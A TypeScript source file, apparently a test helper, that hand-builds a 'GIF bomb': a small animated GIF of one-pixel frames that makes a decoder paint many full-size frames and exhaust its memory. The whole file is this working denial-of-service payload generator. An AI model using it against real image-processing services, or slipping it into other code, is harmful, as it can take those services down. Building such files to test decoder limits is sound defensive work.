// An animated GIF that is tiny on disk but large once decoded: every frame is
// a single pixel, yet a decoder paints each one onto the full logical screen
// (`width` x `height`), so `frames` pages of that size come out. Written by
// hand because no encoder will produce such a file on purpose.

function u16(value: number): number[] {
  return [value & 0xff, (value >> 8) & 0xff];
}

export function gifBomb({ width, height, frames }: { width: number; height: number; frames: number }): Buffer {
  const bytes: number[] = [
    ...Buffer.from('GIF89a'),
    // logical screen, then a two-colour global table (black, white)
    ...u16(width), ...u16(height), 0xf0, 0, 0,
    0, 0, 0, 0xff, 0xff, 0xff,
    // loop forever
    0x21, 0xff, 0x0b, ...Buffer.from('NETSCAPE2.0'), 0x03, 0x01, 0x00, 0x00, 0x00,
  ];
  for (let frame = 0; frame < frames; frame++) {
    bytes.push(
      // graphic control: keep the previous frame, 100 ms
      0x21, 0xf9, 0x04, 0x04, ...u16(10), 0x00, 0x00,
      // a 1x1 image at the bottom-right corner: the canvas has to reach it
      0x2c, ...u16(width - 1), ...u16(height - 1), ...u16(1), ...u16(1), 0x00,
      // LZW (minimum code size 2): clear, the pixel (alternating colours), end
      0x02, 0x02, frame % 2 ? 0x4c : 0x44, 0x01, 0x00,
    );
  }
  bytes.push(0x3b);
  return Buffer.from(bytes);
}
